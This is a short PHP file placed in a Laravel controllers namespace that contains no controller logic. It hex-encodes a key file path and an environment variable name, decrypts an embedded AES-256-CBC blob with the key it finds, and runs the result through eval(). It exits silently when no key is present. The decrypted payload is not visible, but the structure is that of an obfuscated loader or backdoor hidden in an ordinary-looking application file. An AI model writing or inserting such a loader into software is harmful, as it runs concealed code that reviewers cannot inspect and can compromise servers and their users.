<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3n8nSjo/FoxEbvvkM24BYA==');

$c=base64_decode(

'+ucCLmYoRwNOTHeSzB7bEBQj/CraoXkWRlDHP16aw1ThXKsjLsCyi29SkyCn5aVgmxSh7+kgbR8W' .
'Re6e3CkMaH/F9HhpcAe9550TvnVvMKTxVr0WGcuz8cuD6KB6gfIQ/kMIFA/gCyQ67iu4G60YAxJ1' .
'VHgmScMCb/raQgbOAx8V6MZw64KIAC01VKzaGXD/73bn5MESrH/pPfEdp+HwwJrGKcD3jPhB+d/u' .
'gNcHcxEo7Kw25BllU71vugZX+al+'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

